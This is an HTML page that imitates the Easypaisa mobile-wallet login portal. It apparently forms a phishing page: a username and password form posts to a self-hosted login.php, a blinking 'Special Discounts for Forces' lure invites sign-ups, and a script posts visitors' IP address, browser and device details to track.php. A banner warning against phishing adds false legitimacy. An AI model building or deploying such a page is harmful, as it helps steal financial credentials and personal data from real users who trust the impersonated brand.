<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Easypaisa Login</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            color: #333;
        }
        .header {
            background: linear-gradient(to right, #00796b, #004d40);
            color: #fff;
            padding: 40px 20px;
            text-align: center;
            position: relative;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }
        .header .left-logo {
            position: absolute;
            top: 10px;
            left: 20px;
            width: 120px;
            height: auto;
        }
        .header .right-logo {
            position: absolute;
            top: 10px;
            right: 20px;
            width: 200px;
            height: auto;
        }
        .header .center-logo {
        width: 100px; /* Adjust size as needed */
        height: auto;
        display: block;
        margin: 0 auto;
    }
    .footer {
        background: #00796b;
        color: #fff;
        text-align: left;
        padding: 20px;
        font-size: 18px;
        margin-top: 50px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .footer-logo {
        width: 150px; /* Adjust size as needed */
        height: auto;
    }
        .header h1 {
            font-size: 36px;
            font-weight: 700;
            margin: 0;
        }
        .container {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            padding: 50px 20px;
            max-width: 1200px;
            margin: auto;
            gap: 40px;
        }
        .box {
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0px 10px 30px #A7C539;
            flex: 1;
            min-width: 300px;
            max-width: 400px;
            transition: transform 0.3s ease-in-out;
        }
        .box:hover {
            transform: translateY(-5px);
        }
        .box h3 {
            background: #004d40;
            color: #fff;
            padding: 15px;
            text-align: center;
            margin: -40px -40px 20px -40px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            font-size: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
            color: #00796b;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            background: #00796b;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 18px;
            width: 100%;
            cursor: pointer;
            border-radius: 8px;
            transition: background 0.3s ease-in-out;
        }
        .btn:hover {
            background: #004d40;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        .forgot-password a {
            color: #00796b;
            text-decoration: none;
            font-weight: 600;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .security-alert {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 30px;
    background: #f9f9f9;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    border-left: 5px solid #00796b;
}

.alert-image {
    width: 300px;
    height: auto;
    margin-top: 20px;
}

.alert-text {
    text-align: center;
    flex: 1;
}

.alert-heading {
    font-weight: bold;
    font-size: 26px;
    color: rgb(255, 0, 0);
    margin: 0;
}

.alert-divider {
    border: 1px solid #ccc;
    margin: 15px auto;
    width: 50%;
}

ul {
    list-style: none;
    padding-left: 0;
    margin: 20px auto;
    display: inline-block;
    text-align: left;
}

ul li {
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    font-size: 18px; /* Larger font size */
    font-weight: bold; /* Make text bold */
    line-height: 1.6; /* Add line spacing */
}

ul li span {
    font-size: 22px; /* Bigger icons */
    color: #A7C539;
    margin-right: 15px; /* Increased space for better emphasis */
}

/* Responsive Styles for Mobile */
@media (max-width: 768px) {
    .security-alert {
        padding: 20px;
    }

    .alert-image {
        width: 200px;
        margin-top: 0;
    }

    .alert-text {
        text-align: left;
    }

    .alert-heading {
        font-size: 20px;
    }

    ul li {
        font-size: 16px; /* Slightly larger than previous for mobile */
    }
}


        @media (max-width: 768px) {
            .header .left-logo, 
            .header .right-logo {
                display: none;
            }
            .header h1 {
                font-size: 28px;
            }
            .container {
                flex-direction: column;
                align-items: center;
            }
        }
        .disclaimer {
        color: red;
        font-weight: bold;
        
        text-align: center;
        margin-left: 80px;
        animation: blink 1s infinite;
    }

    @keyframes blink {
        50% { opacity: 0; }
    }
    </style>
</head>
<body>

<div class="header">
    <img src="es2.png" alt="Left Logo" class="left-logo">
    <img src="f2.png" alt="Easypaisa Logo" class="center-logo">
    <img src="es3.png" alt="Right Logo" class="right-logo">
</div>

<div class="container">
    <div class="box">
        <h3>Login</h3>.
        <!-- Form action changed to login.php for login handling -->
        <form action="login.php" method="post">
            <div class="input-group">
                <label>Username*</label>
                <input type="text" name="username" required placeholder="Enter your username">
            </div>
            <div class="input-group">
                <label>Password*</label>
                <input type="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit" class="btn">Login</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot Password?</a>
        </div>
    </div>

    <div class="box">
    <h3>I am a new user</h3>
    <p><strong>Register and save time</strong></p>
    <ul>
        <li>Money Transfer</li>
        <li>Pay Bills</li>
        <li>Bank Transfer</li>
        <li>Donations</li>
        <li>Account Statements</li>
        <li class="disclaimer">Special Discounts for Forces</li>
    </ul>
    <!-- Sign Up button now links to signup.php -->
    <a href="signup.php"><button class="btn">Sign Up</button></a>
</div>
</div>

    
</div>

<div class="security-alert">
    <img src="lock.png" alt="Security Icon" class="alert-image">
    <div class="alert-text">
        <p class="alert-heading">Important Security Alert: Protect yourself from Phishing emails and malware</p>
        <hr class="alert-divider">
        <ul>
            <li>Create a strong password with at least 8 characters that includes a combination of mixed case letters and numbers.</li>
            <li>Change your password every 90 days.</li>
            <li>Do not use the same password for all online accounts.</li>
            <li>Never share your password and OTP with anyone.</li>
            <li>Beware of and never respond to fraudulent emails or phone calls requesting sensitive information.</li>
            <li>Easypaisa, Tameer Bank, or Telenor will never ask for your sensitive information via phone or email.</li>
            <li>Always type the correct portal address in the browser's address bar.</li>
            <li>Do not access the merchant portal through unknown email links.</li>
            <li>Always log out properly from the portal and never leave it signed in when away.</li>
        </ul>
    </div>
</div>




<div class="footer">
    © 2025 Easypaisa. All Rights Reserved.
    <img src="f2.png" alt="Easypaisa Logo" class="footer-logo">
</div>
<script>
    // Function to track user data when a link is clicked
    function trackClick(event) {
        // Prevent the default link behavior
        event.preventDefault();

        // Collect necessary user information
        const userData = {
            ip_address: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
            phone: '', // Retrieve from input if available
            email: '', // Retrieve from input if available
            browser: navigator.userAgent,
            os: navigator.platform,
            device: (navigator.userAgent.match(/Mobile/i)) ? 'Mobile' : 'Desktop',
            user_agent: navigator.userAgent,
            clicked_at: new Date().toISOString()
        };

        // Send data to track_user_click.php using fetch
        fetch('track.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        })
        .then(response => response.json())
        .then(data => {
            // Redirect to the signup page after tracking
            window.location.href = 'signup.php';
        })
        .catch(error => console.error('Error:', error));
    }
</script>


</body>
</html>
